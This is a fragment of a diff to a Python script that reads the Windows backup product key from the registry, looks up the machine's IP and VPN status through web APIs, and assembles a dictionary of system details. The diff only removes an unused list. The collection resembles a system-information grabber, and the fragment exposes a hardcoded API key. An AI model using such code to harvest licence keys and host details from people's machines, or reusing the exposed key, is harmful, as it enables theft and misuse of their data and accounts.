@@ -61,7 +61,6 @@ ProductKey = winreg.QueryValueEx(ProductKeyPath, "BackupProductKeyDefault")
 ipinfo = json.loads(requests.get('http://ipinfo.io/json').text)
 vpnapiio_key = "e21de3cd57104f3fbfdaf2cde703d240"
 vpninfo = json.loads(requests.get(f"https://vpnapi.io/api/{ipinfo['ip']}?key={vpnapiio_key}").text)
-AllUsers = []
 all = {
 "OSname" : osname,
 "OSrelease" : release,
